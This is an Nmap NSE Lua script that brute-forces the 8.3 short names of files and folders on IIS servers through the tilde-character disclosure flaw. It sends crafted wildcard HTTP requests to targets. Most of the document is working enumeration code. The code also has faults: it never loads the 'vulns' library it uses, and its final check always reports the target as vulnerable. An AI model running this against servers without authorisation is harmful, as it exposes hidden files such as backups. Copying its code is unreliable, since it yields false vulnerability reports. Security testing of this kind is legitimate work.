description = [[
Attempts to brute force the 8.3 filename (commonly known as short name) of files and directories in the root folder of vulnerable IIS servers. This script is an implementation of the PoC "iis shortname scanner".

The script uses ~,? and * to bruteforce the short name of files present in the IIS document root. Short names have a restriction of 6 character file name followed by a three character extension.

Notes:
* The script might have to be run twice (according to the original author). 
* Tested against IIS 6.0 and 5.1.

References:
* Research paper: http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf
* IIS Shortname Scanner PoC: http://code.google.com/p/iis-shortname-scanner-poc/
]]

---
-- @usage
-- nmap -p80 --script http-iis-short-name-brute <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http
-- | http-iis-short-name-brute: 
-- |   Folders
-- |     aspnet~1
-- |   Files
-- |     sql~1.bak
-- |_    test~1.php
-- 
---

author = {"Jesper Kueckelhahn", "Paulino Calderon"}
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "brute"}

local stdnse    = require "stdnse"
local shortport = require "shortport"
local http      = require "http"

portrule = shortport.http

local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
local magic = "/*.aspx?aspxerrorpath=/"

local folders = {}
folders["name"] = "Folders"
local files = {}
files["name"] = "Files"
local last_number = 0
local errors_max = false
local errors = 0

local function isFolder(host, port, path, number)
  local data = http.get(host, port, "/" ..  path .. "~" .. number .. magic)
  return data.status == 404
end


local function isLonger(host, port, path, number)
  local data = http.get(host, port, "/" .. path .. "%3f*~" .. number .. "*" .. magic)
  return data.status == 404
end


local function foundName(host, port, path, number)
  local data = http.get(host, port, "/" .. path .. "~" .. number .. "*" .. magic)
  return data.status == 404
end


local function charInExtension(host, port, path, ext)
  local data = http.get(host, port, "/" .. path .. ext .. "*" .. magic )
  return data.status == 404
end

local function findExtension(host, port, path, ext)
  if charInExtension(host, port, path, ext) then		
  -- currently only support for ext of length 3
    if ext:len() == 3 then 
      stdnse.print_debug(1, "Added file: %s", path .. ext)		
      table.insert(files, path .. ext)
    else
      for c in chars:gmatch(".") do
        findExtension(host, port, path, ext .. c)
      end
    end
  end
end

local function findName(host, port, path, number)      
  -- check if the name is valid
  if foundName(host, port, path, number) then
    if isFolder(host, port, path, number) then
      --If the last 10 pages return 404, exit to deal to false positive case.
      if tonumber(number) == (last_number + 1) then
        errors = errors+1
      end
      if errors>10 then
        stdnse.print_debug(1, "%s:False positive detected. Exiting.", SCRIPT_NAME)
	errors_max=true
      else
        stdnse.print_debug(1, "Added folder: %s", path .. "~" .. number)
        table.insert(folders, path .. "~" .. number)

        -- increase the number ('~1' to '~2')
        last_number = number
        local nextNumber = tostring(tonumber(number) + 1) 
        findName(host, port, path, nextNumber)
      end
    -- if the name is valid, and it's not a folder, it must be a file		
    else
      findExtension(host, port, path .. "~" .. number .. ".", "")			
      -- increase the number ('~1' to '~2')
      local nextNumber = tostring(tonumber(number) + 1) 
      findName(host, port, path, nextNumber)
    end
  end

  -- is the path valid (i.e. 404)
  local cont = isLonger(host, port, path, number)
	
  -- recurse if the path is valid and the length of path is not 6
  if not (path:len() == 6) and cont and not(errors_max) then
    stdnse.print_debug(1, "Testing: %s", path .. "~" .. number)
    for c in chars:gmatch(".") do findName(host, port, path .. c, number) end
  end
end


action = function(host, port)
  local vuln = {
    title = 'Microsoft IIS tilde character "~" short name disclosure',
    state = vulns.STATE.NOT_VULN,
    description = [[
Multiple IIS versions disclose the short names of files and directories with an 8.3 file naming scheme equivalent in Windows.
    ]],
    references = {
      'http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf',
      'http://code.google.com/p/iis-shortname-scanner-poc/'
    }
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  findName(host, port, "", "1")
  --Cleans the false positive results.
  if errors_max then
    files = {}
    folders = {}
  end
  --Vulnerable!
  if #files or #folders then
    results = {}
    table.insert(results, folders)
    table.insert(results, files)
    vuln.state = vulns.STATE.VULNERABLE
    results.name = "8.3 filenames found:"
    vuln.extra_info = stdnse.format_output(true, results)
    return vuln_report:make_output(vuln)
  end
end
